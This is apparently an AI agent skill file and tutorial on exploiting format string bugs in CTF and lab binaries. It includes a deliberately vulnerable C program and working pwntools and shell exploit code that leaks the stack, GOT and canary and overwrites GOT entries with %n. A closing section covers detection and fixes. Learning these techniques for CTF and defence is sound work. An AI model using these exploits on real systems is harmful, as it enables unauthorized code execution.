---
name: format-strings
description: Use when you need to exploit a format string vulnerability on
  an authorized target, such as a CTF pwn challenge or lab binary that passes
  user input directly to printf or a similar function. Covers finding the
  positional parameter offset, reading stack and memory with %x and %s,
  leaking libc and binary addresses to defeat ASLR and PIE, writing values
  with %n, and automating exploitation with pwntools 4.13 fmtstr_payload.
  Use when user input reaches a printf-family function as the format string,
  or when you need an info leak to enable another exploit primitive.
version: 1.0.0
domain: binary
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [pwn-fundamentals]
tools:
  - name: pwntools
    version: "4.13"
  - name: GDB
    version: 15.2
  - name: Python
    version: "3.12"
  - name: gcc
    version: 14.x
---

A format string vulnerability happens when user input is passed as the
format argument to `printf` and friends instead of as a value to print.
The attacker then controls the format specifiers: `%x` reads stack words,
`%s` dereferences pointers, and `%n` writes the printed character count
to a chosen address. That makes one bug both an arbitrary read and an
arbitrary write. This skill covers the authorized workflow for finding
and exploiting format string bugs with pwntools and GDB. All exploitation
targets binaries you have written permission to test, such as CTF
challenges or lab systems.

## Quick Workflow

1. Confirm the bug: user input reaches `printf(user_input)` with no
   format string.
2. Find your positional parameter offset: which `%n$x` prints your own
   input back.
3. Read the stack with `%x` to map interesting values: canary, saved
   registers, libc pointers.
4. Leak addresses: use `%s` on GOT entries or stack pointers to defeat
   ASLR and PIE.
5. Write with `%n`: overwrite a GOT entry or return address to hijack
   control flow.
6. Automate with pwntools `fmtstr_payload` once the offset and target
   are known.
7. Verify against the remote service, watching for output buffering and
   filter differences.

## 1. Confirm and find the offset

```bash
# Build a practice binary with a format string bug
cat > fmt.c <<'EOF'
#include <stdio.h>
int main() {
    char buf[128];
    fgets(buf, sizeof(buf), stdin);
    printf(buf);   // vulnerable: user input is the format string
    return 0;
}
EOF
gcc -no-pie -o fmt fmt.c

# Confirm: %x specifiers print stack contents
echo 'AAAA.%x.%x.%x.%x' | ./fmt
# Output like: AAAA.b7f... .<stack words> ... 41414141
```

The `41414141` in the output is your `AAAA` input visible on the
stack. Count which position it appears at, or find it directly with
positional parameters:

```bash
# Which position echoes our marker? Try positions until it appears
for i in $(seq 1 20); do
  printf "START-%d-END %%%d\$x" $i $i | ./fmt | grep -o 'START-.*' | head -1
done
```

pwntools automates offset discovery:

```python
#!/usr/bin/env python3
from pwn import *

def send_fmt(payload):
    p = process('./fmt')
    p.sendline(payload)
    out = p.recvall(timeout=2)
    p.close()
    return out

autofmt = FmtStr(send_fmt)
print("offset:", autofmt.offset)  # positional parameter of our input
```

## 2. Reading memory: stack and pointers

With the offset known, read arbitrary stack words:

```bash
# Dump 20 stack words starting at your offset (example offset 6)
python3 -c "print('%6\$x.'*20)" | ./fmt
```

Interpret the output: look for values that look like addresses
(starting with `0x7f` for libc, `0x55` or `0x56` for the binary, `0x7ff`
for the stack). A value ending in recognizable low bytes (like a
return address into `__libc_start_main`) is a leak candidate.

Read a pointed-to address with `%s`:

```bash
# GOT address of puts as an argument, then %<offset>$s reads it
# (no PIE example: puts@got = 0x404018)
python3 -c "import struct,sys; sys.stdout.buffer.write(struct.pack('<Q',0x404018) + b'%6\$s....')" | ./fmt | xxd | head -5
```

Caveats: `%s` stops at the first null byte, so leaked addresses print
truncated if they contain `0x00` bytes in the middle (rare on 64-bit
for libc addresses, but possible). If output looks cut, the leak still
contains the low bytes; reconstruct the rest from alignment.

A cleaner leak loop in Python:

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./fmt')
p = process('./fmt')

def leak(addr):
    p.sendline(b'AA' + p64(addr) + b' %7$s END')
    p.recvuntil(b'AA')
    data = p.recvuntil(b' END', drop=True)
    return data

puts_got = exe.got['puts']
leaked = leak(puts_got)
print("puts @", hex(u64(leaked.ljust(8, b'\x00'))))
```

## 3. Defeating ASLR and PIE with leaks

Two leaks cover almost every exploit:

- A libc leak: `%s` on a GOT entry (puts, printf) gives a libc
  address; subtract the symbol offset for libc base.
- A binary leak: a stack value that is a return address into the
  binary, or `%s` on a binary GOT entry, gives the binary base when
  PIE is on.

```python
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
puts_addr = u64(leak(exe.got['puts']).ljust(8, b'\x00'))
libc.address = puts_addr - libc.symbols['puts']
print("libc base:", hex(libc.address))
```

For PIE binaries, leak a binary address the same way. A stack return
address into `main` works: compute `binary_base = leak - main_offset`,
where `main_offset` comes from `objdump` or `exe.symbols['main']`
(which is the offset when PIE is on).

## 4. Writing with %n

`%n` writes the number of characters printed so far to the address
given by the corresponding argument. Control the count with padding,
and you have an arbitrary write.

```bash
# Write the value 64 to the address at position 6
# %64c prints 64 chars, %6$n writes 64 to the 6th argument
python3 -c "import struct,sys; sys.stdout.buffer.write(struct.pack('<Q',0x404018) + b'%64c%6\$n')" | ./fmt
```

Writing large values one byte at a time with `%hhn` (write one byte)
is the practical approach: four `%hhn` writes build any 32-bit value
without printing gigabytes of padding.

```python
# Manual 4-byte write of 0xdeadbeef to target, input at position 6
# Split into bytes sorted ascending to keep padding positive:
# ef(239) be(190) ad(173) de(222) -> order: ad, be, de, ef
writes = {0x404018+2: 0xad, 0x404018+1: 0xbe, 0x404018: 0xef, 0x404018+3: 0xde}
```

Doing this by hand is error-prone, which is why step 5 exists.

## 5. Automate with fmtstr_payload

pwntools builds the whole write payload from a dictionary of
address-to-value pairs:

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./fmt')
p = process('./fmt')

def send_payload(payload):
    p.sendline(payload)
    return p.recvall(timeout=2)

# fmtstr_payload(offset, writes): offset = our positional parameter
writes = {exe.got['printf']: exe.symbols['win']}
payload = fmtstr_payload(6, writes)
p.sendline(payload)
p.interactive()
```

The classic target is a GOT entry: overwrite `printf@got` with the
address of `win` or `system`, then trigger another `printf` call. On
binaries with Full RELRO the GOT is read-only, so target a function
pointer, a return address on the stack, or `.dtors`/`.fini_array`
instead.

For 64-bit values, `fmtstr_payload` handles the multi-write splitting
internally. Verify the write took effect by leaking the target address
back with a `%s` read before relying on it.

## 6. Putting it together: leak then write

The full pattern for a hardened binary (PIE + canary) is: leak the
canary and PIE base with reads, then write with `%n`.

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./fmt_pie')
libc = ELF('./libc.so.6')
p = process('./fmt_pie')

# Step 1: find offset (do once manually, hardcode after)
OFFSET = 6

# Step 2: leak stack canary (example: canary sits at a known stack position)
p.sendline(b'%13$x')   # tune the position by inspecting output
canary = int(p.recvline().strip(), 16)
print("canary:", hex(canary))

# Step 3: leak a binary address for PIE base
p.sendline(b'%15$x')
pie_leak = int(p.recvline().strip(), 16)
exe.address = pie_leak - 0x1234  # offset of the leaked return site

# Step 4: overwrite a GOT entry with win()
writes = {exe.got['printf']: exe.symbols['win']}
p.sendline(fmtstr_payload(OFFSET, writes))
p.interactive()
```

Positions 13 and 15 are examples; every binary differs. Map your
target's stack once with a `%x` dump and annotate which position holds
the canary (a value ending in `00` that does not look like an address)
and which holds code pointers.

## Edge cases

- Output buffering hides leaks. If the program does not flush before
  reading the next input, responses arrive late or merged. Add
  `p.recv()` timeouts and match on markers, not line counts.
- The format function is `sprintf` into a fixed buffer, not `printf`.
  Your payload must fit the buffer, and `%n` writes still work, but
  you cannot see the output; use a blind write or a second info leak.
- Positional parameters (`%6$x`) are filtered but plain `%x` is not.
  Walk the stack sequentially instead, counting positions by hand.
- The binary strips or truncates at the first null byte. Keep the
  payload null-free: place addresses after the format string or use
  short writes that avoid `0x00` bytes.
- `%n` is disabled by `_FORTIFY_SOURCE` (`%n` protection). Modern
  distributions may block `%n` in some contexts; check with a direct
  test before building the whole exploit around writes.
- Wide characters or Unicode input mangle the payload. Confirm the
  input path is byte-clean with an echo test before trusting leaks.

## Escalation

- You have a read but `%n` is blocked: use the leak to enable a
  different primitive. A libc leak plus a stack leak turns a separate
  buffer overflow into a full exploit (see pwn-fundamentals).
- You have a write but no useful leak: overwrite `printf@got` with
  `system` blindly if you know the libc version, or overwrite a
  function pointer with a one_gadget and brute-force the ASLR bits
  on a forking service.
- The only format sink is in a rarely called function: trigger it
  repeatedly. Many CTF binaries let you call the vulnerable function
  in a loop, giving unlimited leak and write attempts.
- Full RELRO plus no function pointers in reach: write to
  `.fini_array` (called at exit) or stack return addresses. Both need
  a stack address leak first.

## Detection and defender view

Defenders detect format string probing through `%x` and `%n` sequences
in input logs and WAF rules, and through crash patterns when probes
dereference bad pointers. The durable fix is never passing user input
as the format string: `printf("%s", user_input)`. Compiler warnings
(`-Wformat-security`) catch this at build time, and `_FORTIFY_SOURCE`
adds runtime `%n` protection. For code review, grep for `printf(`,
`sprintf(`, and `syslog(` calls where the format argument is a
variable rather than a string literal; each one is a candidate.

## Key references

- CWE-134 (Use of Externally-Controlled Format String).
- CWE-787 (Out-of-bounds Write): what `%n` becomes.
- CWE-200 (Exposure of Sensitive Information): what `%x` leaks become.
- MITRE ATT&CK T1068 (Exploitation for Privilege Escalation).
- pwntools fmtstr docs: https://docs.pwntools.com/en/stable/fmtstr.html
- OWASP: Format String Attack: https://owasp.org/www-community/attacks/Format_string_attack

## See also

- `ctf-pwn-basics-format-strings`: Use it instead for the competition version, framed around exploiting format strings to reach a flag.
